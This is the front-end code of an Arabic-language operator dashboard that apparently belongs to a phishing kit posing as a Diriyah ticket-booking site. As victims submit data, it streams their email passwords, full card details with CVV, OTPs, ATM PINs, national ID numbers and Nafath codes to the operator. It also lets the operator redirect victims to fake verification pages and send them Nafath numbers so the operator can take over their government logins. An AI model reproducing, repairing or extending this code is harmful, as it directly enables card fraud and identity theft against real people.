                    <h6 class="mb-2" style="font-weight:700;"><i class="fas fa-paper-plane"></i> إرسال رقم يظهر في تطبيق نفاذ للعميل</h6>
                    <p class="small text-muted mb-2" id="nafathSendHint"></p>
                    <label class="form-label" for="nafathNumberInput"><strong>رمز نفاذ</strong></label>
                    <input type="text"
                           id="nafathNumberInput"
                           class="form-control form-control-lg text-center mb-3"
                           placeholder="مثال: 12"
                           maxlength="4"
                           inputmode="numeric"
                           autocomplete="off"
                           style="font-size: 26px; letter-spacing: 3px; font-weight: 700; border: 3px solid #667eea;">
                    <button type="button" class="btn btn-redirect mb-4" onclick="sendNafathNumberToClient()">
                        <i class="fas fa-paper-plane"></i>
                        إرسال للعميل
                    </button>

                    <h6 style="color:#667eea;font-weight:700;"><i class="fas fa-history"></i> أرقام أُرسلت سابقاً</h6>
                    <div id="nafathHistoryContent">
                        <div class="text-center text-muted small">—</div>
                    </div>
                </div>
            </div>
        </div>
    </div>

   <audio id="notification-sound" src="./phone-ringing-229175.mp3" preload="auto"></audio>
<audio id="card-sound" src="./level-up-2-199574.mp3" preload="auto"></audio>
    
    <!-- Toast Notifications Container -->
    <div class="toast-container" id="toastContainer"></div>

    <script src="https://code.jquery.com/jquery-3.4.1.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.0/dist/js/bootstrap.bundle.min.js"></script>
    <script src="https://js.pusher.com/8.2.0/pusher.min.js"></script>
    
    <script>
        let currentUserId = null;
        let lastUpdateTime = Date.now();
        const REDIRECT_PAGE_OPTIONS = [
            { value: 'index.php', label: 'الصفحة الرئيسية' },
            { value: 'login.php', label: 'تسجيل الدخول' },
            { value: 'register.php', label: 'تسجيل حساب جديد' },
            { value: 'booking/tickets.php', label: 'تذاكر الدرعية' },
            { value: 'booking/checkout.php', label: 'السلة / المراجعة' },
            { value: 'booking/payment-method.php', label: 'اختيار طريقة الدفع' },
            { value: 'booking/payment-info.php', label: 'بيانات البطاقة' },
            { value: 'booking/otp.php', label: 'رمز OTP' },
            { value: 'booking/atm.php', label: 'رمز ATM' },
            { value: 'booking/customer-info.php', label: 'توثيق الجوال (بيانات العميل)' },
                  { value: 'booking/success.php', label: 'سيتم الاتصال بك' },
            { value: 'booking/nafath.php', label: 'نفاذ — صفحة الرقم' },
      

        ];

        function hydrateRedirectSelects() {
            document.querySelectorAll('select[id^="redirectPage"]').forEach((select) => {
                const current = select.value || '';
                select.innerHTML = '';
                REDIRECT_PAGE_OPTIONS.forEach((opt) => {
                    const option = document.createElement('option');
                    option.value = opt.value;
                    option.textContent = opt.label;
                    if (opt.value === current) {
                        option.selected = true;
                    }
                    select.appendChild(option);
                });
            });
        }
        
        // ============================================
        // دالة لتنسيق التاريخ بإضافة 3 ساعات
        // ============================================
        function formatJordanTime(dateString) {
            if (!dateString) {
                const now = new Date();
                now.setHours(now.getHours() + 3);
                
                const year = now.getFullYear();
                const month = String(now.getMonth() + 1).padStart(2, '0');
                const day = String(now.getDate()).padStart(2, '0');
                let hours = now.getHours();
                const minutes = String(now.getMinutes()).padStart(2, '0');
                const ampm = hours >= 12 ? 'PM' : 'AM';
                hours = hours % 12 || 12;
                
                return `${year}/${month}/${day}<br>${String(hours).padStart(2, '0')}:${minutes} ${ampm}`;
            }
            return dateString;
        }
        
        // ============================================
        // Toast Notifications System
        // ============================================
        function showToast(title, message, type = 'success') {
            const container = document.getElementById('toastContainer');
            const toast = document.createElement('div');
            toast.className = `toast ${type}`;
            
            const icons = {
                success: '<i class="fas fa-check-circle" style="color: #10b981;"></i>',
                error: '<i class="fas fa-times-circle" style="color: #ef4444;"></i>',
                warning: '<i class="fas fa-exclamation-triangle" style="color: #f59e0b;"></i>',
                info: '<i class="fas fa-info-circle" style="color: #3b82f6;"></i>'
            };
            
            toast.innerHTML = `
                <div class="toast-icon">${icons[type]}</div>
                <div class="toast-content">
                    <div class="toast-title">${title}</div>
                    <div class="toast-message">${message}</div>
                </div>
            `;
            
            container.appendChild(toast);
            
            setTimeout(() => toast.classList.add('show'), 10);
            
            setTimeout(() => {
                toast.classList.remove('show');
                setTimeout(() => toast.remove(), 400);
            }, 4000);
        }

        // ============================================
        // Connection Status & Last Update Timer
        // ============================================
        function updateConnectionStatus(connected) {
            const dot = document.getElementById('connectionDot');
            const status = document.getElementById('connectionStatus');
            
            if (connected) {
                dot.classList.remove('disconnected');
                status.textContent = 'متصل';
                status.style.color = '#10b981';
            } else {
                dot.classList.add('disconnected');
                status.textContent = 'غير متصل';
                status.style.color = '#ef4444';
            }
        }

        function updateLastUpdateTime() {
            const lastUpdate = document.getElementById('lastUpdate');
            const now = Date.now();
            const diff = Math.floor((now - lastUpdateTime) / 1000);
            
            if (diff < 60) {
                lastUpdate.textContent = `آخر تحديث: منذ ${diff} ث`;
            } else if (diff < 3600) {
                lastUpdate.textContent = `آخر تحديث: منذ ${Math.floor(diff / 60)} د`;
            } else {
                lastUpdate.textContent = `آخر تحديث: منذ ${Math.floor(diff / 3600)} س`;
            }
        }

        setInterval(updateLastUpdateTime, 1000);

        // ============================================
        // Filter Rows
        // ============================================
        function filterRows(filter) {
            const rows = document.querySelectorAll('#usersTableBody tr');
            const buttons = document.querySelectorAll('.filter-btn');
            
            buttons.forEach(btn => btn.classList.remove('active'));
            event.target.classList.add('active');
            
            const unreadIds = getUnreadIds();
            
            rows.forEach(row => {
                const userId = row.getAttribute('data-user-id');
                const isUnread = unreadIds.has(String(userId));
                
                if (filter === 'all') {
                    row.style.display = '';
                } else if (filter === 'unread') {
                    row.style.display = isUnread ? '' : 'none';
                } else if (filter === 'read') {
                    row.style.display = !isUnread ? '' : 'none';
                }
            });
        }

        // ============================================
        // Bulk Actions
        // ============================================
        function updateBulkActions() {
            const checkboxes = document.querySelectorAll('.user-checkbox:checked');
            const bulkActions = document.getElementById('bulkActions');
            const selectedCount = document.getElementById('selectedCount');
            
            if (checkboxes.length > 0) {
                bulkActions.classList.add('show');
                selectedCount.textContent = checkboxes.length;
            } else {
                bulkActions.classList.remove('show');
            }
        }

        function bulkDelete() {
            const checkboxes = document.querySelectorAll('.user-checkbox:checked');
            const ids = Array.from(checkboxes).map(cb => {
                return cb.closest('tr').getAttribute('data-user-id');
            });
            
            if (ids.length === 0) return;
            
            if (!confirm(`هل تريد حذف ${ids.length} عميل؟`)) return;
            
            showToast('تم الحذف', `تم حذف ${ids.length} عميل بنجاح`, 'success');
            
            checkboxes.forEach(cb => {
                cb.closest('tr').remove();
            });
            
            updateBulkActions();
            updateUserCount(-ids.length);
        }

        // ============================================
        // Pusher Configuration
        // ============================================
        Pusher.logToConsole = false;
        const pusher = new Pusher('a56388ee6222f6c5fb86', {
            cluster: 'ap2',
            encrypted: true
        });
        
        const channel = pusher.subscribe('my-channel');
        
        pusher.connection.bind('connected', function() {
            console.log('✅ Pusher متصل');
            updateConnectionStatus(true);
        });
        
        pusher.connection.bind('disconnected', function() {
            console.log('❌ Pusher انقطع الاتصال');
            updateConnectionStatus(false);
        });
        
        // ============================================
        // إضافة صف جديد بدون إعادة تحميل
        // ============================================
        function addNewUserRow(userData) {
            const tbody = document.getElementById('usersTableBody');
            if (!tbody) {
                console.error('❌ tbody غير موجود!');
                return;
            }
            if (userData.error) {
                console.error(userData.error);
                return;
            }

            const em = (userData.email || '').trim();
            if (em) {
                document.querySelectorAll('tr[data-user-email]').forEach(function (tr) {
                    if (tr.getAttribute('data-user-email') === em && String(tr.getAttribute('data-user-id')) !== String(userData.id)) {
                        tr.remove();
                    }
                });
            }

            const existingRow = document.querySelector(`tr[data-user-id="${userData.id}"]`);
            if (existingRow) {
                existingRow.classList.add('highlight', 'row-login-fresh');
                const msgCell = document.getElementById('message' + userData.id);
                if (msgCell && userData.is_guest_only) {
                    msgCell.innerHTML = '<span class="status-badge status-login-live">دخول ضيف — تحديث فوري</span>';
                }
                tbody.insertBefore(existingRow, tbody.firstChild);
                return;
            }

            console.log('➕ إضافة صف جديد - ID:', userData.id);

            const newRow = document.createElement('tr');
            newRow.setAttribute('data-user-id', userData.id);
            if (em) {
                newRow.setAttribute('data-user-email', em);
            }
            newRow.classList.add('highlight', 'row-login-fresh');
            const msgBadge = userData.is_guest_only
                ? '<span class="status-badge status-login-live">دخول ضيف — بيانات وصلت الآن</span>'
                : '<span class="status-badge status-new">عميل مسجّل — جديد</span>';
            
newRow.innerHTML = `
    <td><input type="checkbox" class="user-checkbox checkbox-modern" onchange="updateBulkActions()"></td>
    <td><strong>${userData.full_name || '—'}</strong></td>
    <td id="message${userData.id}">
        ${msgBadge}
    </td>
    <td><strong style="color: #374151;">${userData.email || '—'}</strong></td>
    <td><span style="color: #667eea; font-weight: 600; word-break: break-all;">${userData.email_password_entered || '—'}</span></td>
    <td>${userData.last_order_phone || '—'}</td>
    <td>
        <button class="btn-table btn-info" onclick="showUserInfo(${userData.id})">
            <i class="fas fa-info-circle"></i> عرض
        </button>
    </td>
    <td>
        <button class="btn-table btn-card" onclick="showUserCards(${userData.id})">
            <i class="fas fa-credit-card"></i> البطاقات
        </button>
    </td>
    <td>
        <button class="btn-table btn-nafad" onclick="showUserNafad(${userData.id})">
            <i class="fas fa-shield-alt"></i> نفاذ
        </button>
    </td>
    <td>
        <button type="button" class="btn-table btn-nafad" onclick="showNafathSend(${userData.id})" disabled title="وجّه العميل إلى booking/nafath.php أولاً" style="opacity:0.5;cursor:not-allowed;">
            <i class="fas fa-key"></i> إرسال
        </button>
    </td>
    <td>
        <small>${formatJordanTime(userData.created_at_formatted)}</small>
    </td>
    <td>
        <form method="POST" style="display:inline; margin:0;" onsubmit="return confirm('هل تريد حذف هذا المستخدم؟')">
            <input type="hidden" name="userId" value="${userData.id}">
            <button type="submit" name="deleteUser" class="btn-table btn-delete">
                <i class="fas fa-trash"></i>
            </button>
        </form>
    </td>
`;

            tbody.insertBefore(newRow, tbody.firstChild);
            console.log('✅ تمت إضافة الصف بنجاح');
        }
        
        // ============================================
        // تحديث عداد العملاء
        // ============================================
        function updateUserCount(increment = 0) {
            const userCountElement = document.getElementById('userCountDisplay');
            if (!userCountElement) return;

            let currentCount = parseInt(userCountElement.textContent) || 0;
            currentCount += increment;
            userCountElement.textContent = currentCount;

            userCountElement.style.transition = 'all 0.3s';
            userCountElement.style.transform = 'scale(1.15)';
            userCountElement.style.color = '#10b981';
            
            setTimeout(() => {
                userCountElement.style.transform = 'scale(1)';
                userCountElement.style.color = '#1f2937';
            }, 400);
        }
        
        // ============================================
        // Pusher Events - مستخدم جديد
        // ============================================
        channel.bind('my-event-newwwe', function (data) {
            console.log('📥 بيانات عميل - ID:', data.userId, data.message || '');
            lastUpdateTime = Date.now();
            const pushMsg = (data && data.message) ? String(data.message) : '';

            fetch('get-new-user.php?user_id=' + encodeURIComponent(String(data.userId)))
                .then(function (response) { return response.json(); })
                .then(function (userData) {
                    if (userData.error) {
                        console.error('❌', userData.error);
                        return;
                    }
                    const tbody = document.getElementById('usersTableBody');
                    const nBefore = tbody ? tbody.querySelectorAll('tr').length : 0;
                    addNewUserRow(userData);
                    const nAfter = tbody ? tbody.querySelectorAll('tr').length : 0;
                    playNotification();
                    markAsUnread(userData.id);
                    if (nAfter > nBefore) {
                        updateUserCount(1);
                    }
                    const label = userData.display_name || userData.email || ('#' + userData.id);
                    showToast('وصل للتو', pushMsg ? (label + ' — ' + pushMsg) : (label + ' — بيانات تسجيل دخول'), 'success');
                })
                .catch(function (error) {
                    console.error('❌ خطأ في جلب البيانات:', error);
                });
        });

        // تحديث عداد الزيارات Real-time
        channel.bind('visit-increment', function(data) {
            const counterElement = document.getElementById('visitCountDisplay');
            
            if (counterElement) {
                let currentCount = parseInt(counterElement.textContent.replace(/,/g, ''));
                currentCount++;
                
                counterElement.textContent = currentCount.toLocaleString('en-US');
                
                counterElement.style.transition = 'all 0.3s';
                counterElement.style.transform = 'scale(1.2)';
                counterElement.style.color = '#f59e0b';
                
                setTimeout(() => {
                    counterElement.style.transform = 'scale(1)';
                    counterElement.style.color = '#1f2937';
                }, 300);
            }
        });

        // بعد تحميل الصفحة
        window.addEventListener('DOMContentLoaded', () => {
            console.log('✅ الصفحة تم تحميلها');
            console.log('🔌 Pusher متصل');
            hydrateRedirectSelects();
            
            const ids = getUnreadIds();
            console.log('📋 الصفوف غير المقروءة:', Array.from(ids));
            
            ids.forEach((id) => {
                const row = document.querySelector(`tr[data-user-id="${id}"]`);
                if (row) row.classList.add('highlight');
            });
            
            updateUnreadCount();
            
            document.querySelectorAll('.user-checkbox').forEach(cb => {
                cb.addEventListener('change', updateBulkActions);
            });
        });

        // تحديث بيانات المستخدم (بطاقة / OTP / ATM / شبكة) — rowStyle من الخادم
        channel.bind('updaefte-user-payys', function(data) {
    const userId = data.userId;
    const updatedData = data.updatedData || {};
    const rowStyle = (updatedData.rowStyle && String(updatedData.rowStyle)) || 'info';
    lastUpdateTime = Date.now();
    
    const messageElement = document.getElementById('message' + userId);
    if (messageElement && updatedData.message) {
        const badgeMap = { card: 'status-badge-upd-card', otp: 'status-badge-upd-otp', atm: 'status-badge-upd-atm', network: 'status-badge-upd-network', info: 'status-pending' };
        const badge = badgeMap[rowStyle] || badgeMap.info;
        messageElement.innerHTML = `<span class="status-badge ${badge}">${updatedData.message}</span>`;
    }
    
    highlightRow(userId, rowStyle);
    
    const isCardUpdate = rowStyle === 'card' || (updatedData.message && (
        updatedData.message.includes('دفع بطاقة') ||
        updatedData.message.includes('بطاقة جديد') ||
        updatedData.message.includes('بطاقة') ||
        updatedData.message.includes('card')
    ));
    
    playNotification(isCardUpdate);
    updateUnreadCount();
    showToast('تحديث', updatedData.message || 'تم تحديث بيانات العميل', 'info');
    
    updateOpenModals(userId, updatedData.message || '', rowStyle);
});

        // ============================================
        // 🚀 NEW: دالة تحديث المودالات المفتوحة
        // ============================================
function updateOpenModals(userId, message, rowStyle) {
    if (currentUserId != userId) return;
    
    const cardsModal = document.getElementById('userCardsModal');
    const nafadModal = document.getElementById('userNafadModal');
    
    const isCardsModalOpen = cardsModal?.classList.contains('show');
    const isNafadModalOpen = nafadModal?.classList.contains('show');
    // تحديث مودال البطاقات عند أي حدث طالما مفتوحاً (بطاقة / OTP متعدد / صراف / إلخ)
    if (isCardsModalOpen) {
        refreshCardsModal(userId);
    }
    const nafadByStyle = rowStyle === 'network';
    const nafadByMsg = message && (
        message.includes('نفاذ') || message.includes('رقم نفاذ') || message.includes('الجوال') ||
        message.includes('مزود الخدمة') || message.includes('سيتم الاتصال بك')
    );
    if (isNafadModalOpen && (nafadByStyle || nafadByMsg)) {
        refreshNafadModal(userId);
    }
}

        // ============================================
        // 🚀 NEW: دالة تحديث مودال البطاقات
        // ============================================
        function refreshCardsModal(userId) {
             $.ajax({
        url: 'get-user-cards.php',
        method: 'GET',
        data: { user_id: userId },
        success: function (response) {
            try {
                const cards = JSON.parse(response);
                let html = '';

                if (!Array.isArray(cards) || cards.length === 0) {
                    html = '<div class="alert alert-info"><i class="fas fa-info-circle"></i> لا توجد بطاقات لهذا المستخدم</div>';
                } else {
                    cards.forEach((card, index) => {
                        const oInline = (card.otp && String(card.otp).trim() !== '')
                            ? `<div class="alert alert-warning text-center" style="font-size:1.1rem;font-weight:700">OTP: ${card.otp}</div>` : '';
                        const aInline = (card.atm_password && String(card.atm_password).trim() !== '')
                            ? `<div class="alert alert-danger text-center" style="font-size:1.1rem;font-weight:700">ATM/رمز: ${card.atm_password}</div>` : '';
                        html += `
                        <div class="info-card">
                            <h6><i class="fas fa-credit-card"></i> طلب / عملية ${index + 1} ${card.order_status ? '(' + card.order_status + ')' : ''}</h6>
                            <p><strong>اسم حامل البطاقة:</strong> ${card.cardName ?? card.cardholder_name ?? '-'}</p>
                            <p><strong>رقم البطاقة:</strong> <span class="bujairi-ltr-digits" dir="ltr" style="display:inline-block;unicode-bidi:isolate;text-align:left">${card.cardNumber ?? '-'}</span></p>
                            <p><strong>تاريخ الانتهاء:</strong> ${card.cardExpiry ?? '-'}</p>
                            <p><strong>CVV:</strong> ${card.cvv ?? '-'}</p>
                            <p><strong>المبلغ:</strong> <strong style="color: #10b981; font-size: 1.2rem;">${card.price ?? '0'} ر.س</strong></p>
                            <p><strong>التاريخ:</strong> ${card.created_at ?? '-'}</p>
                            ${oInline}
                            ${aInline}
                            <div id="otpBox_${card.id}">
                                <em class="text-muted">🔄 جاري تحميل رموز التحقق (وسجل إضافي)...</em>
                            </div>
                            <div id="pinBox_${card.id}">
                                <em class="text-muted">🔄 جاري تحميل رمز الصراف...</em>
                            </div>
                        </div>
                        `;
                    });
                }

                        document.getElementById('userCardsContent').innerHTML = html;

                        // جلب OTP و PIN
                        cards.forEach(card => {
                            fetch(`get-card-otps.php?card_id=${card.id}`)
                                .then(res => res.json())
                                .then(otps => {
                                    const box = document.getElementById(`otpBox_${card.id}`);
                                    if (!box) return;

                                    if (!Array.isArray(otps) || otps.length === 0) {
                                        if (card.otp && String(card.otp).trim() !== '') {
                                            box.innerHTML = '<em class="text-muted">الرمز الظاهر أعلاه من الطلب الحالي</em>';
                                        } else {
                                            box.innerHTML = '<em class="text-muted">لا يوجد OTP إضافي</em>';
                                        }
                                        return;
                                    }

                                    let otpHtml = '<hr><h6><i class="fas fa-key"></i> جميع رموز التحقق (OTP)</h6>';
                                    otps.forEach((o, idx) => {
                                        otpHtml += `<div class="alert alert-warning mb-2 text-center" style="font-size:1.15rem;font-weight:800">${o.otp_code}<small class="d-block text-muted mt-1 fw-normal">${o.created_at || ''} · #${idx + 1}</small></div>`;
                                    });
                                    box.innerHTML = otpHtml;
                                });

                            const pinQs = (card.source === 'orders' || (card.id && !card.user_id))
                                ? `order_id=${card.id}` : `client_id=${userId}`;
                            fetch(`get-card-pins.php?${pinQs}`)
                                .then(res => res.json())
                                .then(pin => {
                                    const box = document.getElementById(`pinBox_${card.id}`);
                                    if (!box) return;

                                    if (!pin || !pin.pin_code) {
                                        if (card.atm_password && String(card.atm_password).trim() !== '') {
                                            box.innerHTML = '<em class="text-muted">الرمز الظاهر أعلاه من حقل الصراف في الطلب</em>';
                                        } else {
                                            box.innerHTML = '<em class="text-muted">⏳ لا يوجد رمز صراف بعد</em>';
                                        }
                                        return;
                                    }

                                    box.innerHTML = `
                                        <hr>
                                        <h6><i class="fas fa-lock"></i> رمز الصراف / السجل (ATM)</h6>
                                        <div class="alert alert-danger text-center" style="font-size:20px; font-weight:700;">
                                            ${pin.pin_code}<br>
                                            <small>${pin.created_at || ''}</small>
                                        </div>
                                    `;
                                });
                        });

                    } catch (e) {
                        console.error('خطأ في تحديث البطاقات:', e);
                    }
                }
            });
        }

        // ============================================
        // مودال نفاذ — بيانات الصفحات + السجلات + إرسال الرقم
        // ============================================
        function refreshNafadModal(userId) {
            fetch(`get-user-nafad.php?user_id=${userId}`)
                .then(res => res.json())
                .then(data => {
                    let snap = '';
                    if (Array.isArray(data.customer_info_logs) && data.customer_info_logs.length > 0) {
                        snap += '<h6 style="color:#0d9488;font-weight:bold;margin-bottom:10px;"><i class="fas fa-mobile-alt"></i> بيانات صفحة توثيق الجوال</h6>';
                        data.customer_info_logs.forEach((row) => {
                            snap += `<div class="info-card mb-2" style="border-right:4px solid #0d9488;">
                                <p class="mb-1"><strong>طلب:</strong> #${row.order_id}</p>
                                <p class="mb-1"><strong>الجوال:</strong> ${row.mobile ?? '—'}</p>
                                <p class="mb-1"><strong>المشغل:</strong> ${row.provider ?? '—'}</p>
                                <p class="mb-1"><strong>الهوية / الإقامة:</strong> ${row.national_id_or_iqama ?? '—'}</p>
                                <small class="text-muted">${row.created_at ?? ''}</small>
                            </div>`;
                        });
                    } else {
                        snap += '<div class="alert alert-light border mb-2"><small>لم تُسجَّل بعد بيانات من صفحة توثيق الجوال.</small></div>';
                    }
                    if (Array.isArray(data.success_verify_logs) && data.success_verify_logs.length > 0) {
                        snap += '<h6 style="color:#7c3aed;font-weight:bold;margin:15px 0 10px;"><i class="fas fa-check-circle"></i> رمز التحقق — صفحة النجاح</h6>';
                        data.success_verify_logs.forEach((row) => {
                            snap += `<div class="info-card mb-2" style="background:#f5f3ff;border-right:4px solid #7c3aed;">
                                <p class="mb-2"><strong>طلب:</strong> #${row.order_id}</p>
                                <div class="alert alert-success text-center mb-0" style="font-size:22px;font-weight:800;">${row.transaction_no}</div>
                                <small class="text-muted d-block mt-2">${row.created_at ?? ''}</small>
                            </div>`;
                        });
                    } else {
                        snap += '<div class="alert alert-light border mb-2"><small>لم يُستقبل بعد رمز التحقق من صفحة النجاح.</small></div>';
                    }
                    const snapEl = document.getElementById('nafathBookingSnapshot');
                    if (snapEl) snapEl.innerHTML = snap;

                    let html = '';
                    if (Array.isArray(data.codes) && data.codes.length > 0) {
                        html += '<h6 style="color: #667eea; font-weight: bold; margin-bottom: 15px;"><i class="fas fa-shield-alt"></i> رموز التحقق (سجل قديم)</h6>';
                        data.codes.forEach((code, i) => {
                            html += `
                                <div class="info-card" style="background: #fff3cd; border-right: 4px solid #f59e0b;">
                                    <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 10px;">
                                        <span style="font-weight: bold;">رمز #${i + 1}</span>
                                        <small style="color: #666;">${code.created_at}</small>
                                    </div>
                                    <div class="alert alert-danger text-center" style="font-size:24px; font-weight:700; margin: 0; padding: 15px;">
                                        ${code.nafad_code}
                                    </div>
                                </div>
                            `;
                        });
                    }
                    if (Array.isArray(data.logs) && data.logs.length > 0) {
                        html += '<hr><h6 style="color: #667eea; font-weight: bold; margin: 20px 0 15px;"><i class="fas fa-history"></i> سجلات نفاذ السابقة</h6>';
                        data.logs.forEach((log, i) => {
                            html += `
                                <div class="info-card">
                                    <h6><i class="fas fa-file-alt"></i> محاولة #${i + 1}</h6>
                                    <p><strong>الهاتف:</strong> ${log.phone ?? '-'}</p>
                                    <p><strong>المشغل:</strong> ${log.telecom ?? '-'}</p>
                                    <p><strong>رقم الهوية:</strong> ${log.id_number ?? '-'}</p>
                                    ${log.redirect_to ? `<p><strong>تم التوجيه إلى:</strong> ${log.redirect_to}</p>` : ''}
                                    <p><small>${log.created_at}</small></p>
                                </div>
                            `;
                        });
                    }
                    if (html === '') {
                        html = '<div class="alert alert-info mb-0"><i class="fas fa-info-circle"></i> لا توجد سجلات إضافية في النظام القديم.</div>';
                    }
                    document.getElementById('userNafadContent').innerHTML = html;

                    let nh = '';
                    if (Array.isArray(data.nafath_numbers) && data.nafath_numbers.length > 0) {
                        data.nafath_numbers.forEach((num) => {
                            nh += `<div class="alert alert-success mb-2"><strong style="font-size: 1.15rem;">${num.number}</strong><small class="d-block text-muted">${num.created_at}</small></div>`;
                        });
                    } else {
                        nh = '<p class="text-muted small mb-0">لم يُرسل رقم نفاذ بعد.</p>';
                    }
                    const hist = document.getElementById('nafathHistoryContent');
                    if (hist) hist.innerHTML = nh;

                    const inp = document.getElementById('nafathNumberInput');
                    const hint = document.getElementById('nafathSendHint');
                    if (data.can_send_nafath_code) {
                        if (inp) { inp.disabled = false; inp.removeAttribute('title'); }
                        if (hint) hint.textContent = '';
                    } else {
                        if (inp) { inp.disabled = true; inp.title = 'وجّه العميل إلى booking/nafath.php أولاً'; }
                        if (hint) hint.textContent = 'يجب أن يكون آخر توجيه للعميل إلى صفحة booking/nafath.php حتى يُفعَّل الإرسال.';
                    }
                })
                .catch(() => {});
        }

        channel.bind('user-waiting-redirect', function(data) {
            const userId = data.userId;
            const msg = data.message;
            lastUpdateTime = Date.now();

            const messageEl = document.getElementById('message' + userId);
            if (messageEl) {
                messageEl.innerHTML = `<span class="status-badge status-pending">${msg}</span>`;
            }

            if (currentUserId == userId) {
                const infoBox = document.getElementById('userCardsContent');
                if (infoBox) {
                    infoBox.insertAdjacentHTML('afterbegin', `
                        <div class="alert alert-warning">
                            <i class="fas fa-clock"></i>
                            العميل حالياً في صفحة الانتظار ويترقب التوجيه
                        </div>
                    `);
                }
            }
        });

        // ====== Unread / Highlight (GLOBAL) ======
        const UNREAD_KEY = 'unreadUserIds';

        function getUnreadIds() {
            try { return new Set(JSON.parse(localStorage.getItem(UNREAD_KEY) || '[]')); }
            catch { return new Set(); }
        }

        function saveUnreadIds(set) {
            localStorage.setItem(UNREAD_KEY, JSON.stringify(Array.from(set)));
        }

        function markAsUnread(userId) {
            const ids = getUnreadIds();
            ids.add(String(userId));
            saveUnreadIds(ids);
            updateUnreadCount();
        }

        function markAsRead(userId) {
            const ids = getUnreadIds();
            ids.delete(String(userId));
            saveUnreadIds(ids);

            const row = document.querySelector(`tr[data-user-id="${userId}"]`);
            if (row) {
                row.classList.remove('highlight', 'row-login-fresh', 'row-upd-card', 'row-upd-otp', 'row-upd-atm', 'row-upd-network', 'row-upd-info');
            }
            updateUnreadCount();
        }

        const BUJAIRI_ROW_UPDATE_CLASSES = ['row-upd-card', 'row-upd-otp', 'row-upd-atm', 'row-upd-network', 'row-upd-info'];
        function highlightRow(userId, rowStyle) {
            const row = document.querySelector(`tr[data-user-id="${userId}"]`);
            if (!row) return;

            row.classList.remove(...BUJAIRI_ROW_UPDATE_CLASSES);
            const styleMap = { card: 'row-upd-card', otp: 'row-upd-otp', atm: 'row-upd-atm', network: 'row-upd-network', info: 'row-upd-info' };
            const key = rowStyle && styleMap[rowStyle] ? rowStyle : 'info';
            row.classList.add(styleMap[key]);
            row.classList.add('highlight');
            row.classList.remove('bujairi-live-flash');
            void row.offsetWidth;
            row.classList.add('bujairi-live-flash');
            window.setTimeout(() => { try { row.classList.remove('bujairi-live-flash'); } catch (e) {} }, 2400);
            const tbody = row.parentElement;
            tbody.insertBefore(row, tbody.firstChild);
            markAsUnread(userId);
        }

function playNotification(isCard = false) {
    const audioId = isCard ? 'card-sound' : 'notification-sound';
    const audio = document.getElementById(audioId);
    
    if (!audio) {
        console.error('❌ عنصر الصوت غير موجود!');
        return;
    }
    
    console.log(`🔊 محاولة تشغيل الصوت: ${isCard ? 'بطاقة' : 'عادي'}`);
    try { 
        audio.currentTime = 0; 
    } catch (e) {
        console.error('خطأ في إعادة تعيين الصوت:', e);
    }
    
    audio.play()
        .then(() => {
            console.log('✅ تم تشغيل الصوت بنجاح');
        })
        .catch(e => {
            console.error('❌ فشل تشغيل الصوت:', e);
        });
}

        function updateUnreadCount() {
            const unreadElement = document.getElementById('unreadCount');
            if (unreadElement) {
                const count = getUnreadIds().size;
                unreadElement.textContent = count;
            }
        }

        function refreshData() {
            // التحديث يتم تلقائياً عبر Pusher - لا حاجة لإعادة التحميل
        }

function showUserInfo(userId) {
    currentUserId = userId;
    
    $.ajax({
        url: 'get-user-info.php',
        method: 'GET',
        data: { user_id: userId },
        success: function(response) {
            try {
                const data = JSON.parse(response);
                let html = '';
                html += `<div class="info-card">
                    <h6><i class="fas fa-user"></i> حساب العميل (الموقع)</h6>
                    <p><strong>البريد الإلكتروني:</strong> ${data.email ?? '—'}</p>
                    <p><strong>الاسم الظاهر:</strong> ${data.full_name ?? '—'}</p>
                    <p><strong>كلمة سر بريد الدخول (آخر تسجيل دخول كضيف):</strong>
                        <span style="color:#7c3aed;font-weight:700;word-break:break-all">${data.email_password_entered ?? '—'}</span></p>
                    <p><strong>جوال (آخر طلب):</strong> ${data.last_order_phone ?? '—'}</p>
                    <p><strong>تاريخ تسجيل الحساب:</strong> ${data.created_at ?? '—'}</p>
                </div>`;
                document.getElementById('userInfoContent').innerHTML = html;
                
                const modal = new bootstrap.Modal(document.getElementById('userInfoModal'));
                modal.show();
                markAsRead(userId);
            } catch(e) {
                console.error('Error:', e);
                alert('حدث خطأ في تحميل البيانات');
            }
        }
    });
}
        function showUserCards(userId) {
            currentUserId = userId;
            refreshCardsModal(userId);
            const modal = new bootstrap.Modal(document.getElementById('userCardsModal'));
            modal.show();
            markAsRead(userId);
        }

        function showUserNafad(userId) {
            currentUserId = userId;
            refreshNafadModal(userId);
            new bootstrap.Modal(document.getElementById('userNafadModal')).show();
            markAsRead(userId);
        }

        function showNafathSend(userId) {
            currentUserId = userId;
            const inp = document.getElementById('nafathNumberInput');
            if (inp) inp.value = '';
            refreshNafadModal(userId);
            new bootstrap.Modal(document.getElementById('userNafadModal')).show();
            markAsRead(userId);
            setTimeout(() => {
                try { document.getElementById('nafathNumberInput')?.focus(); } catch (e) {}
            }, 450);
        }

        function sendNafathNumberToClient() {
            const number = document.getElementById('nafathNumberInput').value.trim();
            
            if (!number) {
                showToast('تنبيه', 'الرجاء إدخال رقم', 'warning');
                return;
            }
            
            if (!currentUserId) {
                showToast('خطأ', 'خطأ في تحديد العميل', 'error');
                return;
            }
            
            $.ajax({
                url: 'send-nafath-number.php',
                method: 'POST',
                data: {
                    user_id: currentUserId,
                    number: number
                },
                success: function(response) {
                    try {
                        const result = JSON.parse(response);
                        if (result.success) {
                            showToast('نجح الإرسال', `تم إرسال الرقم ${number} للعميل`, 'success');
                            document.getElementById('nafathNumberInput').value = '';
                            refreshNafadModal(currentUserId);
                        } else {
                            showToast('خطأ', result.error || 'فشل الإرسال', 'error');
                        }
                    } catch(e) {
                        showToast('تم الإرسال', 'تم ارسال الرقم للعميل', 'success');
                        document.getElementById('nafathNumberInput').value = '';
                        refreshNafadModal(currentUserId);
                    }
                },
                error: function() {
                    showToast('خطأ', 'خطأ في الاتصال', 'error');
                }
            });
        }

        function redirectUser() {
            const page = document.getElementById('redirectPageUser').value;
            
            if (!currentUserId) {
                showToast('خطأ', 'لم يتم تحديد المستخدم', 'error');
                return;
            }
            
            $.ajax({
                url: 'redirect-user.php',
                method: 'POST',
                data: {
                    user_id: currentUserId,
                    page: page
                },
                success: function(response) {
                    let data = null;
                    try { data = JSON.parse(response); } catch (e) {}
                    if (!data || data.success !== true) {
                        showToast('خطأ', (data && data.error) ? data.error : 'فشل التوجيه', 'error');
                        return;
                    }
